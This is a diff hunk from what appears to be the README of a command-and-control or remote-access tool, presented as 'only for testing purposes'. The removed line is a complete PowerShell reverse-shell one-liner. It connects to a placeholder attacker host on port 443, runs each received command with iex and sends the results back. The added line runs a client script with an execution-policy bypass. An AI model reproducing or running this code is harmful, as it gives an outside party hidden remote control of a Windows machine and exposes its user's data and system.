@@ -26,4 +26,4 @@ This is only for testing purposes, not intended for anything illegal. I was test
     - Linux / MacOS
       - `python3 client.py`
     - Windows
-        - `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('<DEATHSTAR_IP>',443);$s=$c.GetStream();$s.Write([byte[]](@(0x0A)),0,1);while($true){$b=[byte[]]::new(1024);$r=$s.Read($b,0,1024);$t=[text.encoding]::ASCII.GetString($b,0,$r).Trim();if($t -eq 'die'){exit};if($t -eq 'hostname'){$o=$env:COMPUTERNAME}elseif($t -eq 'whoami'){$o=$env:USERNAME}else{$o=iex $t 2>&1|Out-String};$o=$o.Trim()+[char]10;$d=[text.encoding]::ASCII.GetBytes($o);$s.Write($d,0,$d.Length)}"`
+        - `powershell -bypass client.ps1`
